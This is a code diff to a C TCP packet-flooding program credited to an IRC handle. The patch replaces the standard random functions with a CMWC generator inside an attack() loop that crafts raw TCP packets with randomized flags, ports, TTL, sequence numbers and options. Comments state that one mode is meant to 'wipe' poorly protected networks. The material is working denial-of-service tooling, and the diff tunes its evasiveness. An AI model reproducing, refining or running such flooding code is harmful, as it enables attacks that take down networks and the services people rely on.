@@ -55,7 +55,7 @@ By darkness@efnet. // greetz vae@efnet.
 
 // Code configuration, don't modify unless you know what you're doing!
 //#define DEBUG_TCP                                 // Debug various TCP related things, gives printed information when enabled.
-#define PHI                           0x3133742069  // Number generation seed
+#define PHI                           0xedc12       // Number generation seed
 #define FLAGLIST_DIGITAL_GANGSTA      129           // Digital Gangsta Stomper,
 #define FLAGLIST_RAND_TCP             130           // Used to wipe basically any unprotected, or poorly configured protected networks.
 #define EPHEMERAL_PORT_MIN            16383         // Min ephemeral TCP port randomization
@@ -136,6 +136,7 @@ struct tcphdr2
     unsigned short th_win;          /* window */
     unsigned short th_sum;          /* checksum */
     unsigned short th_urp;          /* urgent pointer */
+
 };
 
 struct tcp_opthdr
@@ -259,7 +260,7 @@ void attack(unsigned int pktqueue, unsigned int dstip, unsigned int srcip, unsig
     int x;
     for (x = 0; x <= sizeof(tcpbuf.buf) - 1; x++)
     {
-        tcpbuf.buf[x] = random();
+        tcpbuf.buf[x] = rand_cmwc();
     }
 
     // copy into pseudo header
@@ -285,10 +286,10 @@ void attack(unsigned int pktqueue, unsigned int dstip, unsigned int srcip, unsig
     // timestamp
     xf_tcpopt->op6 = 8;
     xf_tcpopt->op7 = 0x0a;
-    xf_tcpopt->op8 = rand();
-    xf_tcpopt->op9 = rand();
-    xf_tcpopt->op10 = rand();
-    xf_tcpopt->op11 = rand();
+    xf_tcpopt->op8 = rand_cmwc();
+    xf_tcpopt->op9 = rand_cmwc();
+    xf_tcpopt->op10 = rand_cmwc();
+    xf_tcpopt->op11 = rand_cmwc();
     xf_tcpopt->op12 = 0;
     xf_tcpopt->op13 = 0;
     xf_tcpopt->op14 = 0;
@@ -321,7 +322,7 @@ void attack(unsigned int pktqueue, unsigned int dstip, unsigned int srcip, unsig
     xf_iphdr->ip_ttl = ttl;
 
     // Set IP ID randomly.
-    xf_iphdr->ip_id = htons(random());
+    xf_iphdr->ip_id = htons(rand_cmwc());
 
     // Set the TCP flag(s)
     xf_tcphdr->th_flags = flags;
@@ -334,8 +335,8 @@ void attack(unsigned int pktqueue, unsigned int dstip, unsigned int srcip, unsig
     }
     else
     {
-        xf_tcphdr->th_seq = htonl(rand());
-        xf_tcphdr->th_ack = htonl(rand());
+        xf_tcphdr->th_seq = htonl(rand_cmwc());
+        xf_tcphdr->th_ack = htonl(rand_cmwc());
     }
 
     // Calculate IP len and offset
@@ -430,11 +431,11 @@ void attack(unsigned int pktqueue, unsigned int dstip, unsigned int srcip, unsig
         // Flag randomizations.
         if (flags == FLAGLIST_RAND_TCP)
         {
-            xf_tcphdr->th_flags = a_flags[(rand() % 10) + 1];
+            xf_tcphdr->th_flags = a_flags[(rand_cmwc() % 10) + 1];
         }
         if (flags == FLAGLIST_DIGITAL_GANGSTA)
         {
-            xf_tcphdr->th_flags = a_flags[(rand() % 11) + 1];
+            xf_tcphdr->th_flags = a_flags[(rand_cmwc() % 11) + 1];
         }
         // If packet flag is SYN, set TCP-ACK and TCP-SEQ accordingly.
         if (xf_tcphdr->th_flags == 2)
@@ -444,55 +445,55 @@ void attack(unsigned int pktqueue, unsigned int dstip, unsigned int srcip, unsig
         }
         else
         {
-            xf_tcphdr->th_seq = htonl(rand());
-            xf_tcphdr->th_ack = htonl(rand());
+            xf_tcphdr->th_seq = htonl(rand_cmwc());
+            xf_tcphdr->th_ack = htonl(rand_cmwc());
         }
 
         // Randomize TSVal
-        xf_tcpopt->op8 = rand();
-        xf_tcpopt->op9 = rand();
-        xf_tcpopt->op10 = rand();
-        xf_tcpopt->op11 = rand();
+        xf_tcpopt->op8 = rand_cmwc();
+        xf_tcpopt->op9 = rand_cmwc();
+        xf_tcpopt->op10 = rand_cmwc();
+        xf_tcpopt->op11 = rand_cmwc();
 
         // Randomize IP ID
-        xf_iphdr->ip_id = htons(random());
+        xf_iphdr->ip_id = htons(rand_cmwc());
 
         // Randomize winsize
         if (winsize == 0)
         {
-            xf_tcphdr->th_win = htons(((rand() % TCP_WINDOW_SIZE_MAX) + TCP_WINDOW_SIZE_MIN));
+            xf_tcphdr->th_win = htons(((rand_cmwc() % TCP_WINDOW_SIZE_MAX) + TCP_WINDOW_SIZE_MIN));
         }
         else if (winsize == 1)
         {
-            xf_tcphdr->th_win = htons(((rand() > RAND_MAX / 2) ? 64800 : 64240));
+            xf_tcphdr->th_win = htons(((rand_cmwc() > RAND_MAX / 2) ? 64800 : 64240));
         }
         // Randomize TTL
         if (ttl == 0)
         {
-            xf_iphdr->ip_ttl = ((rand() % TCP_TTL_MAX) + TCP_TTL_MIN);
+            xf_iphdr->ip_ttl = ((rand_cmwc() % TCP_TTL_MAX) + TCP_TTL_MIN);
         }
         // Randomized source ports
         if (dstport == 0)
         {
-            xf_tcphdr->th_dport = htons(((rand() % RAND_PORT_MAX) + RAND_PORT_MIN));
+            xf_tcphdr->th_dport = htons(((rand_cmwc() % RAND_PORT_MAX) + RAND_PORT_MIN));
             ps_tcphdr->th_dport = xf_tcphdr->th_dport;
             sin.sin_port = xf_tcphdr->th_dport;
         }
         else if (dstport == 1)
         {
-            xf_tcphdr->th_dport = htons(((rand() % EPHEMERAL_PORT_MIN) + EPHEMERAL_PORT_MAX));
+            xf_tcphdr->th_dport = htons(((rand_cmwc() % EPHEMERAL_PORT_MIN) + EPHEMERAL_PORT_MAX));
             ps_tcphdr->th_dport = xf_tcphdr->th_dport;
             sin.sin_port = xf_tcphdr->th_dport;
         }
         // Randomized destination ports
         if (srcport == 0)
         {
-            xf_tcphdr->th_sport = htons(((rand() % RAND_PORT_MAX) + RAND_PORT_MIN));
+            xf_tcphdr->th_sport = htons(((rand_cmwc() % RAND_PORT_MAX) + RAND_PORT_MIN));
             ps_tcphdr->th_sport = xf_tcphdr->th_sport;
         }
         else if (srcport == 1)
         {
-            xf_tcphdr->th_sport = htons(((rand() % EPHEMERAL_PORT_MIN) + EPHEMERAL_PORT_MAX));
+            xf_tcphdr->th_sport = htons(((rand_cmwc() % EPHEMERAL_PORT_MIN) + EPHEMERAL_PORT_MAX));
             ps_tcphdr->th_sport = xf_tcphdr->th_sport;
         }
         // Calculate IP len
